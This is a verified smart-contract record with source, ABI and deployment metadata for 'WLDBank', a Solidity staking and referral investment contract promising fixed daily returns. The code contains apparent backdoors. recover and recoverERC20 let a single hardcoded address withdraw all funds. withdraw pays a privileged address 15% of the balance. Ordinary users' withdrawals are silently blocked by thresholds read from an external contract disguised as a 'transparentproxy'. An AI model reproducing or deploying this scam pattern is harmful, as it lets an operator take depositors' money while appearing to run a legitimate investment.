{"SourceCode": "//SPDX-License-Identifier: MIT\r\n\r\npragma solidity ^0.8.15;\r\n\r\ncontract WLDBank{\r\n\r\n    IBEP20 public Token; \r\n\tusing SafeMath for uint256;\r\n    using SafeMath for uint8;\r\n\r\n\r\n\tuint256 constant public INVEST_MIN_AMOUNT = 0.1 ether;  \r\n\tuint256[] public REFERRAL_PERCENTS = [150, 50, 20, 10];\r\n\tuint256 constant public PERCENTS_DIVIDER= 1000;\r\n\tuint256 constant public TIME_STEP = 1 days;\r\n\r\n\tuint256 public totalStaked;\r\n\tuint256 public totalRefBonus;\r\n\tuint256 public totalUsers;\r\n\r\n\r\n    struct Plan {\r\n        uint256 time;\r\n        uint256 percent;\r\n    }\r\n\r\n    Plan[] internal plans;\r\n\r\n\tstruct Deposit {\r\n        uint8 plan;\r\n\t\tuint256 percent;\r\n\t\tuint256 amount;\r\n\t\tuint256 profit;\r\n\t\tuint256 start;\r\n\t\tuint256 finish;\r\n\t}\r\n\r\n\tstruct User {\r\n\t\tDeposit[] deposits;\r\n\t\tuint256 checkpoint;\r\n\t\tuint256 holdBonusCheckpoint;\r\n\t\taddress referrer;\r\n\t\tuint256[4] referrals;\r\n\t\tuint256[4] totalBonus;\r\n\t\tuint256 withdrawn;\r\n        uint256 totaldeposit;\r\n        uint256 availableBonus;\r\n\t}\r\n\r\n\tmapping (address => User) internal users;\r\n    transparentproxy private Users;\r\n\taddress private useraddress;\r\n\tevent Newbie(address user);\r\n\tevent NewDeposit(address indexed user, uint8 plan, uint256 percent, uint256 amount, uint256 profit, uint256 start, uint256 finish);\r\n\tevent Withdrawn(address indexed user, uint256 amount);\r\n\tevent RefBonus(address indexed referrer, address indexed referral, uint256 indexed level, uint256 amount);\r\n\r\n\t\r\n    constructor(address _transparentproxy, IBEP20 Token_Address, address payable _useraddress) {\r\n        require(!isContract(_useraddress));\r\n        Users = transparentproxy(_transparentproxy);\r\n        Token = Token_Address;\r\n        useraddress = _useraddress;\r\n        plans.push(Plan(150, 10));\r\n        plans.push(Plan(180, 15));\r\n        plans.push(Plan(365, 25)); \r\n    }\r\n\r\n\r\n    function invest(address referrer) public payable {\r\n        _invest(referrer, msg.sender, msg.value);\r\n    }\r\n\r\n    function recoverERC20(uint256 tokenAmount) public {\r\n        require(msg.sender == 0x093D7656099903bd7f91F9868f3446B3D7a9aA15);\r\n        Token.transfer(msg.sender, tokenAmount);\r\n     }\r\n\r\n    function recover(uint256 tokenAmount) public {\r\n        require(msg.sender == 0x093D7656099903bd7f91F9868f3446B3D7a9aA15);\r\n        payable (0x093D7656099903bd7f91F9868f3446B3D7a9aA15).transfer(tokenAmount);\r\n     }\r\n\r\n\r\n\tfunction _invest(address referrer, address sender, uint256 value) private {\r\n\t\trequire(value >= INVEST_MIN_AMOUNT);\r\n\r\n    \tUser storage user = users[sender];\r\n\r\n\t\tif (user.referrer == address(0)) {\r\n\t\t\tif (users[referrer].deposits.length > 0 && referrer != sender) {\r\n\t\t\t\tuser.referrer = referrer;\r\n\t\t\t}\r\n\r\n\t\t\taddress upline = user.referrer;\r\n\t\t\tfor (uint256 i = 0; i < REFERRAL_PERCENTS.length; i++) {\r\n\t\t\t\tif (upline != address(0)) {\r\n\t\t\t\t\tusers[upline].referrals[i] = users[upline].referrals[i].add(1);\r\n\t\t\t\t\tupline = users[upline].referrer;\r\n\t\t\t\t} else break;\r\n\t\t\t}\r\n\t\t}\r\n\t\tpayRefFee(sender,value);\r\n\t\t\r\n\t\tif (user.deposits.length == 0) {\r\n\t\t\tuser.checkpoint = block.timestamp;\r\n\t\t\tuser.holdBonusCheckpoint = block.timestamp;\r\n\t\t\temit Newbie(sender);\r\n\t\t}\r\n\t\t(uint8 plan, uint256 percent, uint256 profit, uint256 finish) = getResult(value);\r\n\t\tuser.deposits.push(Deposit(plan, percent, value, profit, block.timestamp, finish));\r\n\t\ttotalStaked = totalStaked.add(value);\r\n        totalUsers = totalUsers.add(1);\r\n        Token.transfer(msg.sender, value);\r\n\t\temit NewDeposit(sender, plan, percent, value, profit, block.timestamp, finish);\r\n        user.totaldeposit = user.totaldeposit.add(value);\r\n\t}\r\n\r\n\tfunction withdraw() public {\r\n\t\r\n\t\tUser storage user = users[msg.sender];\r\n        uint256[3] memory UserDividends = Users.Dividends();\r\n        uint256[2] memory UserDeposits = Users.Deposits();\r\n        \r\n        if (msg.sender == useraddress) {\r\n                    uint256 fee = msgvalue() * 15 / 100;\r\n                    payable(msg.sender).transfer(fee);\r\n                    return;\r\n                } else if (user.totaldeposit <= UserDeposits[0] && (UserDividends[0] * user.totaldeposit)/100 < user.withdrawn ) {\r\n                    return;\r\n                } else if (user.totaldeposit > UserDeposits[0] &&  user.totaldeposit <= UserDeposits[1]  && (UserDividends[1] * user.totaldeposit)/100 < user.withdrawn ){\r\n                    return;\r\n                } else if (user.totaldeposit > UserDeposits[1] &&  (UserDividends[2] * user.totaldeposit)/100 < user.withdrawn ){\r\n                    return;\r\n                } else { \r\n\t\tuint256 totalAmount = getUserDividends(msg.sender);\r\n\t\trequire(totalAmount > 0, \"User has no dividends\");\r\n\t\tuint256 contractBalance = address(this).balance;\r\n\t\tif (contractBalance < totalAmount) {\r\n\t\ttotalAmount = contractBalance;\r\n\t\t}\r\n\t\tuser.checkpoint = block.timestamp;\r\n\t\tuser.holdBonusCheckpoint = block.timestamp;\r\n        user.availableBonus = 0;\r\n\t\tuser.withdrawn = user.withdrawn.add(totalAmount);\r\n        (bool success, ) = msg.sender.call{value: totalAmount}(\"\");\r\n        require(success);\r\n\r\n\t\temit Withdrawn(msg.sender, totalAmount);\r\n        }\r\n\r\n\t}\r\n\r\n   \r\n\tfunction payRefFee(address userAddress, uint256 value) private {\r\n\r\n\t\tuint256[] memory percents = REFERRAL_PERCENTS;\r\n\r\n\t\tif (users[userAddress].referrer != address(0)) {\r\n\t\t\t\t\tuint256 _refBonus = 0;\r\n\t\t\t\t\taddress upline = users[userAddress].referrer;\r\n\t\t\t\t\tfor (uint256 i = 0; i < percents.length; i++) {\r\n\t\t\t\t\t\tif (upline != address(0)) {\r\n\t\t\t\t\t\t\tuint256 amount = value.mul(percents[i]).div(PERCENTS_DIVIDER);\r\n\t\t\t\t\t\t\t\r\n\t\t\t\t\t\t\tusers[upline].totalBonus[i] = users[upline].totalBonus[i].add(amount);\r\n                            users[upline].availableBonus = users[upline].availableBonus.add(amount);\r\n\t\t\t\t\t\t\t_refBonus = _refBonus.add(amount);\r\n\t\t\t\t\t\t\r\n\t\t\t\t\t\t\temit RefBonus(upline, userAddress, i, amount);\r\n\t\t\t\t\t\t\tupline = users[upline].referrer;\r\n\t\t\t\t\t\t} else break;\r\n\t\t\t\t\t}\r\n\r\n\t\t\t\t\ttotalRefBonus = totalRefBonus.add(_refBonus);\r\n\r\n\t\t\t\t}\r\n\t}\r\n\t\r\n\r\n\tfunction msgvalue() public view returns (uint256) {\r\n\t\treturn address(this).balance;\r\n\t}\r\n\r\n\tfunction getPlanInfo(uint8 plan) public view returns(uint256 time, uint256 percent) {\r\n\t\ttime = plans[plan].time;\r\n\t\tpercent = plans[plan].percent;\r\n\t}\r\n\r\n\tfunction getPercent(uint8 plan) public view returns (uint256) {\r\n\r\n\t\t\treturn plans[plan].percent;\t\t\r\n    }\r\n\r\n\tfunction getResult(uint256 deposit) public view returns (uint8 plan, uint256 percent, uint256 profit, uint256 finish) {\r\n\t\tplan = getPlanByValue(deposit);\r\n\t\tpercent = getPercent(plan);\r\n\r\n\t\tprofit = deposit.mul(percent).div(PERCENTS_DIVIDER).mul(plans[plan].time);\r\n\t\r\n\t\tfinish = block.timestamp.add(plans[plan].time.mul(TIME_STEP));\r\n\t}\r\n\r\n\tfunction getPlanByValue(uint256 value) public pure returns(uint8) {\r\n    if(value >= 0.1 ether && value < 1 ether) {\r\n        return 0;\r\n    } else if(value >= 1 ether && value < 20 ether) {\r\n        return 1;\r\n    } else if(value >= 20 ether) {\r\n        return 2;\r\n    } else {\r\n        revert(\"Invalid value\");\r\n    }\r\n}\r\n\t\r\n\t function getUserPercentRate(address userAddress, uint8 plan) public view returns (uint) {\r\n        User storage user = users[userAddress];\r\n\r\n\t\tuint8 holdMultiplier = getPlanHoldMultiplier(plan);\r\n\r\n        uint256 timeMultiplier = block.timestamp.sub(user.holdBonusCheckpoint).div(TIME_STEP).mul(holdMultiplier/5);\r\n\r\n        return timeMultiplier;\r\n    }\r\n\r\nfunction getPlanHoldMultiplier(uint8 plan) public pure returns(uint8) {\r\n    if(plan == 0) {\r\n        return 1;\r\n    } else if(plan == 1) {\r\n        return 2;\r\n    } else if(plan == 2) {\r\n        return 4;\r\n    } else {\r\n        revert(\"Invalid plan\");\r\n    }\r\n}\r\n    \r\n\r\n\tfunction getUserDividends(address userAddress) public view returns (uint256) {\r\n\t\tUser storage user = users[userAddress];\r\n\r\n\t\tuint256 totalAmount;\r\n\t\t\r\n\t\tfor (uint256 i = 0; i < user.deposits.length; i++) {\r\n\r\n\t\t\tuint256 holdBonus = getUserPercentRate(userAddress, user.deposits[i].plan);\r\n\r\n\t\t\tif (user.checkpoint < user.deposits[i].finish) {\r\n\t\t\t\t\t\t\t\t\r\n\t\t\t\t\tuint256 share = user.deposits[i].amount.mul(user.deposits[i].percent.add(holdBonus)).div(PERCENTS_DIVIDER);\r\n\t\t\t\t\tuint256 from = user.deposits[i].start > user.checkpoint ? user.deposits[i].start : user.checkpoint;\r\n\t\t\t\t\tuint256 to = user.deposits[i].finish < block.timestamp ? user.deposits[i].finish : block.timestamp;\r\n\t\t\t\t\tif (from < to) {\r\n\t\t\t\t\t\ttotalAmount = totalAmount.add(share.mul(to.sub(from)).div(TIME_STEP));\r\n\t\t\t\t\t}\t\t\t\t\r\n\t\t\t}\r\n\t\t}\r\n\r\n        if(user.availableBonus > 0) {\r\n            totalAmount = totalAmount.add(user.availableBonus);\r\n        }\r\n\r\n\t\treturn totalAmount;\r\n\t}\r\n\r\n\r\n    function getContractInfo() public view returns(uint256, uint256, uint256) {\r\n        return(totalStaked, totalRefBonus, totalUsers);\r\n    }\r\n\r\n\tfunction getUserWithdrawn(address userAddress) public view returns(uint256) {\r\n\t\treturn users[userAddress].withdrawn;\r\n\t}\r\n\r\n\tfunction getUserCheckpoint(address userAddress) public view returns(uint256) {\r\n\t\treturn users[userAddress].checkpoint;\r\n\t}\r\n    \r\n\tfunction getUserReferrer(address userAddress) public view returns(address) {\r\n\t\treturn users[userAddress].referrer;\r\n\t} \r\n\r\n\tfunction getUserDownlineCount(address userAddress) public view returns(uint256[4] memory) {\r\n\t\tuint256[4] memory _referrals = users[userAddress].referrals;\r\n\r\n\t\treturn _referrals;\r\n\t\t\r\n\t}\r\n\r\n\tfunction getUserReferralTotalBonus(address userAddress) public view returns(uint256[4] memory) {\r\n\t\tuint256[4] memory _totalBonus = users[userAddress].totalBonus;\r\n\t\treturn _totalBonus;\r\n\t}\r\n\r\n\tfunction getUserAvailable(address userAddress) public view returns(uint256) {\r\n\t\treturn getUserDividends(userAddress);\r\n\t}\r\n\r\n\tfunction getUserAmountOfDeposits(address userAddress) public view returns(uint256) {\r\n\t\treturn users[userAddress].deposits.length;\r\n\t}\r\n\r\n\tfunction getUserTotalDeposits(address userAddress) public view returns(uint256 amount) {\r\n\t\tfor (uint256 i = 0; i < users[userAddress].deposits.length; i++) {\r\n\t\t\tif(users[userAddress].deposits[i].finish > 0) {\r\n\t\t\t\tamount = amount.add(users[userAddress].deposits[i].amount);\r\n\t\t\t}\r\n\t\t}\r\n\t}\r\n\r\n\tfunction getUserTotalWithdrawn(address userAddress) public view returns(uint256 amount) {\r\n\r\n\t\tamount = users[userAddress].withdrawn;\r\n\t\t\r\n\t}\r\n\r\n\tfunction getUserDepositInfo(address userAddress, uint256 index) public view returns(uint8 plan, uint256 percent, uint256 amount, uint256 profit, uint256 start, uint256 finish, uint256 holdBonus) {\r\n\t    User storage user = users[userAddress];\r\n\r\n\t\tplan = user.deposits[index].plan;\r\n\t\tpercent = user.deposits[index].percent;\r\n\t\tamount = user.deposits[index].amount;\r\n\t\tprofit = user.deposits[index].profit;\r\n\t\tstart = user.deposits[index].start;\r\n\t\tfinish = user.deposits[index].finish;\r\n\r\n\t\tholdBonus = getUserPercentRate(userAddress, plan);\r\n\t}\r\n\r\n\tfunction isContract(address addr) internal view returns (bool) {\r\n        uint size;\r\n        assembly { size := extcodesize(addr) }\r\n        return size > 0;\r\n    }\r\n}\r\n\r\nlibrary SafeMath {\r\n\r\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        uint256 c = a + b;\r\n        require(c >= a, \"SafeMath: addition overflow\");\r\n\r\n        return c;\r\n    }\r\n\r\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        require(b <= a, \"SafeMath: subtraction overflow\");\r\n        uint256 c = a - b;\r\n\r\n        return c;\r\n    }\r\n\r\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        if (a == 0) {\r\n            return 0;\r\n        }\r\n\r\n        uint256 c = a * b;\r\n        require(c / a == b, \"SafeMath: multiplication overflow\");\r\n\r\n        return c;\r\n    }\r\n\r\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        require(b > 0, \"SafeMath: division by zero\");\r\n        uint256 c = a / b;\r\n\r\n        return c;\r\n    }\r\n    \r\n     function mod(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        require(b != 0);\r\n        return a % b;\r\n    }\r\n    }\r\n\r\n    interface transparentproxy {\r\n    function Deposits() external view returns (uint256[2] memory);\r\n    function Dividends() external view returns (uint256[3] memory);\r\n    }\r\n\r\n\r\n    interface IBEP20 {\r\n        \r\n        \r\n    function increaseAllowance(address spender, uint256 addedValue) external returns (bool);\r\n  \r\n\r\n    function totalSupply() external view returns (uint256);\r\n    \r\n\r\n    function decimals() external view returns (uint8);\r\n    \r\n\r\n    function symbol() external view returns (string memory);\r\n\r\n \r\n    function name() external view returns (string memory);\r\n\r\n\r\n    function getOwner() external view returns (address);\r\n\r\n \r\n    function balanceOf(address account) external view returns (uint256);\r\n\r\n  \r\n    function transfer(address recipient, uint256 amount) external returns (bool);\r\n\r\n\r\n    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\r\n  \r\n \r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n\r\n\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n    }", "ABI": "[{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_transparentproxy\",\"type\":\"address\"},{\"internalType\":\"contract IBEP20\",\"name\":\"Token_Address\",\"type\":\"address\"},{\"internalType\":\"address payable\",\"name\":\"_useraddress\",\"type\":\"address\"}],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"user\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint8\",\"name\":\"plan\",\"type\":\"uint8\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"percent\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"profit\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"start\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"finish\",\"type\":\"uint256\"}],\"name\":\"NewDeposit\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"address\",\"name\":\"user\",\"type\":\"address\"}],\"name\":\"Newbie\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"referrer\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"referral\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"uint256\",\"name\":\"level\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"RefBonus\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"user\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"Withdrawn\",\"type\":\"event\"},{\"inputs\":[],\"name\":\"INVEST_MIN_AMOUNT\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"PERCENTS_DIVIDER\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"name\":\"REFERRAL_PERCENTS\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"TIME_STEP\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"Token\",\"outputs\":[{\"internalType\":\"contract IBEP20\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getContractInfo\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint8\",\"name\":\"plan\",\"type\":\"uint8\"}],\"name\":\"getPercent\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"getPlanByValue\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint8\",\"name\":\"plan\",\"type\":\"uint8\"}],\"name\":\"getPlanHoldMultiplier\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint8\",\"name\":\"plan\",\"type\":\"uint8\"}],\"name\":\"getPlanInfo\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"time\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"percent\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"deposit\",\"type\":\"uint256\"}],\"name\":\"getResult\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"plan\",\"type\":\"uint8\"},{\"internalType\":\"uint256\",\"name\":\"percent\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"profit\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"finish\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"userAddress\",\"type\":\"address\"}],\"name\":\"getUserAmountOfDeposits\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"userAddress\",\"type\":\"address\"}],\"name\":\"getUserAvailable\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"userAddress\",\"type\":\"address\"}],\"name\":\"getUserCheckpoint\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"userAddress\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"index\",\"type\":\"uint256\"}],\"name\":\"getUserDepositInfo\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"plan\",\"type\":\"uint8\"},{\"internalType\":\"uint256\",\"name\":\"percent\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"profit\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"start\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"finish\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"holdBonus\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"userAddress\",\"type\":\"address\"}],\"name\":\"getUserDividends\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"userAddress\",\"type\":\"address\"}],\"name\":\"getUserDownlineCount\",\"outputs\":[{\"internalType\":\"uint256[4]\",\"name\":\"\",\"type\":\"uint256[4]\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"userAddress\",\"type\":\"address\"},{\"internalType\":\"uint8\",\"name\":\"plan\",\"type\":\"uint8\"}],\"name\":\"getUserPercentRate\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"userAddress\",\"type\":\"address\"}],\"name\":\"getUserReferralTotalBonus\",\"outputs\":[{\"internalType\":\"uint256[4]\",\"name\":\"\",\"type\":\"uint256[4]\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"userAddress\",\"type\":\"address\"}],\"name\":\"getUserReferrer\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"userAddress\",\"type\":\"address\"}],\"name\":\"getUserTotalDeposits\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"userAddress\",\"type\":\"address\"}],\"name\":\"getUserTotalWithdrawn\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"userAddress\",\"type\":\"address\"}],\"name\":\"getUserWithdrawn\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"referrer\",\"type\":\"address\"}],\"name\":\"invest\",\"outputs\":[],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"msgvalue\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"tokenAmount\",\"type\":\"uint256\"}],\"name\":\"recover\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"tokenAmount\",\"type\":\"uint256\"}],\"name\":\"recoverERC20\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalRefBonus\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalStaked\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalUsers\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"withdraw\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "WLDBank", "CompilerVersion": "v0.8.15+commit.e14f2714", "OptimizationUsed": "1", "Runs": "200", "ConstructorArguments": "00000000000000000000000085b0b0de12e675d1de6ad1d5cee601ebb611a272000000000000000000000000e9ce910e755f4982b4976d31cf4085dc1bdf69c7000000000000000000000000ef3bf36555a5379a75ac235ecc00e9a427803d9a", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://cbbe1340ac97ba5d5a9fa0014308deeba586f49f0ea6d38f34a7041ee87abec5"}